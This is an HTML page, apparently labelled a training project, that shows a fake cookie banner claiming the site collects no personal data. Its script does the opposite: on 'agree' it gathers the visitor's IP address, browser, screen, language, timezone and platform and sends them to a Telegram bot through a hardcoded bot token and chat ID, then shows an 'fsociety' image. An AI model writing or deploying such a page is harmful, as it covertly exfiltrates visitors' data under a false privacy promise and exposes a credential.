<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Учебный проект</title>
    <style>
        body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; text-align: center; }
        h1 { color: #00ffcc; }
        .banner { background: #1a1a1a; padding: 30px; border-radius: 10px; margin: 20px auto; max-width: 500px; border: 1px solid #00ffcc; }
        button { padding: 12px 25px; margin: 10px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
        .agree { background: #00b894; color: white; }
        .deny { background: #d63031; color: white; }
        .info { margin-top: 20px; font-size: 14px; color: #aaa; }
        #fsociety { display: none; margin-top: 30px; }
        #fsociety img { max-width: 1000px; }
    </style>
</head>
<body>
    <h1>Файлы cookie</h1>
    
    <div class="banner" id="banner">
        <p><b>Внимание!</b> Этот сайт не собирает личные данные:</p>
        <button class="agree" onclick="agree()">✅ Согласен</button>
        <button class="deny" onclick="deny()">❌ Отказаться</button>
    </div>

    <div id="fsociety">
        <img src="fsociety.png" alt="fsociety">
    </div>

    <div class="info" id="info"></div>

    <script>
        var TOKEN = "8610253930:AAG9a1mBTDdjdh-gpH6CKxYTM78uOvXwcxM";
        var CHAT_ID = "7235499353";

        function agree() {
            var data = {
                ip: "загрузка...",
                userAgent: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform
            };

            fetch('https://api.ipify.org?format=json')
                .then(function(response) { return response.json(); })
                .then(function(ipData) {
                    data.ip = ipData.ip;
                    sendToTelegram(data);
                })
                .catch(function() {
                    data.ip = "не удалось получить";
                    sendToTelegram(data);
                });

            document.getElementById('banner').style.display = 'none';
            document.getElementById('fsociety').style.display = 'block';
        }

        function deny() {
            document.getElementById('banner').style.display = 'none';
            document.getElementById('info').innerHTML = '❌ Вы отказались. Данные не отправлены.';
        }

        function sendToTelegram(data) {
            var message = "🕵️ Новый посетитель!\n" +
                "IP: " + data.ip + "\n" +
                "Браузер: " + data.userAgent + "\n" +
                "Экран: " + data.screen + "\n" +
                "Язык: " + data.language + "\n" +
                "Часовой пояс: " + data.timezone + "\n" +
                "Платформа: " + data.platform;

            var url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });
        }
    </script>
</body>
</html>
